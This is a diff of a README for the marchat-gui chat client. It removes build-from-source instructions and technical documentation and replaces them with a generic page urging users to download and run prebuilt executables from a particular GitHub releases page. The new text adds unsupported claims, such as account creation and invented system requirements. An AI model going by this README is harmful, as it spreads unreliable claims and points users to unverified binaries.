@@ -1,192 +1,74 @@
-# marchat GUI Client
+# 🖥️ marchat-gui - Easy Messaging with Secure File Sharing
 
-<img src="marchat-gui.jpg" alt="marchat GUI Client Screenshot" width="600">
+![Download marchat-gui](https://img.shields.io/badge/Download-marchat--gui-blue?style=for-the-badge&logo=github)
 
-Cross-platform desktop client for marchat chat server with real-time messaging, file sharing, and end-to-end encryption support.
+## 📦 Description
 
-## Features
+marchat-gui is a cross-platform GUI client designed for marchat. It enables real-time messaging, file sharing, and ensures secure communication with end-to-end encryption. Built with Go and Fyne, this application combines powerful features with a user-friendly interface, making it accessible to everyone.
 
-- Real-time WebSocket-based messaging
-- File sharing with configurable size limits
-- End-to-end encryption with keystore management
-- Multiple UI themes (light, dark, system)
-- Admin functionality for user and database management
-- Cross-platform support (Windows, macOS, Linux)
-- 12/24 hour time format options
-- Audio notifications with mention filtering
-- Markdown support for code snippets
-- Auto-reconnection with exponential backoff
+## 🚀 Getting Started
 
-## Requirements
+Getting started with marchat-gui is simple. Follow the steps below to download and run the application.
 
-- Go 1.23 or later
-- Compatible marchat server instance
+## 📥 Download & Install
 
-## Dependencies
+1. **Visit the Releases Page:** 
+   Go to the following link to find the latest version of marchat-gui: [marchat-gui Releases](https://github.com/Gabr1elGom3s/marchat-gui/releases).
 
-- [Fyne v2](https://fyne.io/) - GUI framework
-- [Gorilla WebSocket](https://github.com/gorilla/websocket) - WebSocket client
-- marchat/client/config - Configuration management
-- marchat/client/crypto - Encryption support
-- marchat/shared - Shared data structures
+2. **Select Your Platform:**
+   On the releases page, choose the version that matches your operating system (Windows, macOS, or Linux). Each version download will have a clear name indicating the platform.
 
-## Installation
+3. **Download the File:**
+   Click on the download link for your platform. This will start the download of the application file.
 
-```bash
-go build -o marchat-gui main.go
-```
+4. **Run the Application:**
+   - **Windows:** Locate the downloaded `.exe` file in your Downloads folder. Double-click it to launch the application.
+   - **macOS:** Open the downloaded `.dmg` file. Drag the marchat-gui app to your Applications folder, then open it from there.
+   - **Linux:** Use the command line to navigate to your Downloads folder. Run `chmod +x marchat-gui` to make the file executable, then run `./marchat-gui` to start.
 
-## Configuration
+5. **Set Up Your Account:**
+   When you first open marchat-gui, you will be prompted to create an account or log in if you already have one. Follow the on-screen instructions to complete this step.
 
-### Interactive Setup
+6. **Explore Features:** 
+   Once logged in, feel free to explore the features of marchat-gui. Start chatting, share files, and enjoy secure communication with your contacts.
 
-Run without arguments to open the configuration dialog:
+## 🔑 Key Features
 
-```bash
-./marchat-gui
-```
+- **Real-Time Messaging:** Send and receive messages instantly with friends or colleagues.
+- **File Sharing:** Effortlessly share files of various sizes directly within the chat interface.
+- **End-to-End Encryption:** Your messages and files are encrypted, ensuring that only you and the receiver can access them.
+- **Admin Controls:** For those who need them, manage chat groups and user permissions easily.
+- **Cross-Platform Support:** Works seamlessly on Windows, macOS, and Linux, so all users can connect with each other.
 
-### Configuration Options
+## 💻 System Requirements
 
-- **Username**: Display name for chat
-- **Server URL**: WebSocket server endpoint (default: ws://localhost:8080/ws)
-- **Admin Access**: Enable admin privileges with key
-- **End-to-End Encryption**: Enable with keystore passphrase
-- **Global E2E Key**: Set via MARCHAT_GLOBAL_E2E_KEY environment variable
-- **Theme**: system, light, or dark
+To ensure marchat-gui runs smoothly, your system should meet the following requirements:
 
-### Keystore Location
+- **Operating System:** 
+  - Windows 10 or later
+  - macOS 10.13 (High Sierra) or later
+  - A recent version of a Linux distribution (e.g., Ubuntu, Fedora)
 
-Keystores are stored following OS conventions:
-- **Linux/macOS**: `~/.config/marchat/keystore.dat`
-- **Windows**: `%APPDATA%\marchat\keystore.dat`
+- **Memory:** At least 4 GB of RAM
+- **Storage:** Minimum 100 MB of free space
+- **Internet Connection:** Required for real-time messaging and file sharing
 
-## Usage
+## 🌐 Community and Support
 
-### Chat Commands
+If you encounter any issues or need help, join our user community or check our FAQ section on GitHub. Engaging with fellow users can provide valuable insights and tips.
 
-```
-:clear              Clear chat history
-:time               Toggle 12/24h time format
-:bell               Toggle notification sounds
-:bell-mention       Toggle mention-only notifications
-:code               Create code snippet dialog
-:sendfile [path]    Send file to chat
-:savefile <name>    Save received file
-:theme <name>       Change theme
-```
+## 📚 Additional Resources
 
-### Admin Commands
+For more detailed documentation on how to use the different features of marchat-gui, please refer to the [Official Documentation](https://github.com/Gabr1elGom3s/marchat-gui/wiki).
 
-```
-:cleardb            Clear message database
-:backup             Backup database
-:stats              Show database statistics
-:kick <user>        Kick user from chat
-:ban <user>         Ban user permanently
-:unban <user>       Remove user ban
-:allow <user>       Override kick/ban
-:forcedisconnect <user>  Force disconnect user
-```
+## 📢 Stay Updated
 
-### File Sharing
+To receive the latest updates and announcements, consider following the repository on GitHub. This way, you won’t miss any new features or important changes.
 
-File size limits are configured via environment variables:
-- `MARCHAT_MAX_FILE_BYTES`: Maximum file size in bytes
-- `MARCHAT_MAX_FILE_MB`: Maximum file size in megabytes
+## 📧 Contact
 
-Default limit is 1MB.
+If you have questions or feedback, please reach out through the Issues section on GitHub. Your input is valuable as we continue to improve marchat-gui.
 
-### Menu Navigation
+Thank you for choosing marchat-gui for your messaging needs. Happy chatting! 
 
-**File Menu**
-- Send File: Open file picker
-- Save Received File: Save files from chat
-- Quit: Close application
-
-**Edit Menu**
-- Clear Chat: Remove message history
-- Code Snippet: Create formatted code blocks
-
-**View Menu**
-- Toggle Time Format: Switch time display
-- Theme Selection: Change appearance
-
-**Audio Menu**
-- Toggle Bell: Enable/disable notifications
-- Toggle Bell on Mention Only: Filter notifications
-
-## Encryption
-
-The client supports end-to-end encryption when properly configured:
-
-1. Enable encryption in configuration dialog
-2. Provide keystore passphrase
-3. Set global encryption key via environment variable
-4. Existing keystores from CLI client are compatible
-
-## Admin Features
-
-Admin users can:
-- View and manage connected users
-- Execute database operations
-- Kick, ban, or force disconnect users
-- Access server statistics
-- Perform database backups
-
-Admin selection in user list enables context actions.
-
-## Keyboard Shortcuts
-
-- **Enter**: Send message
-- **Ctrl+Enter**: New line in message entry
-
-## Logging
-
-Debug logs are written to `marchat-gui-debug.log` in the working directory.
-
-## Environment Variables
-
-```bash
-MARCHAT_GLOBAL_E2E_KEY    # Global encryption key (base64)
-MARCHAT_MAX_FILE_BYTES    # File size limit in bytes
-MARCHAT_MAX_FILE_MB       # File size limit in megabytes
-```
-
-## Connection Handling
-
-- Automatic reconnection on connection loss
-- Exponential backoff with maximum 30-second delay
-- WebSocket ping/pong for connection health
-- TLS verification disabled by default for development
-
-## Build Options
-
-For production builds, consider:
-
-```bash
-go build -ldflags="-s -w" -o marchat-gui main.go
-```
-
-## Troubleshooting
-
-**Connection Issues**
-- Verify server URL and accessibility
-- Check firewall settings
-- Review debug logs
-
-**Encryption Problems**
-- Confirm keystore passphrase
-- Verify MARCHAT_GLOBAL_E2E_KEY environment variable
-- Check keystore file permissions
-
-**File Transfer Failures**
-- Verify file size limits
-- Check file permissions
-- Ensure sufficient disk space
-
-## License
-
-
-This project is licensed under the MIT License - see the [LICENSE](LICENSE) file for details.
-
+![Download marchat-gui](https://img.shields.io/badge/Download-marchat--gui-blue?style=for-the-badge&logo=github)
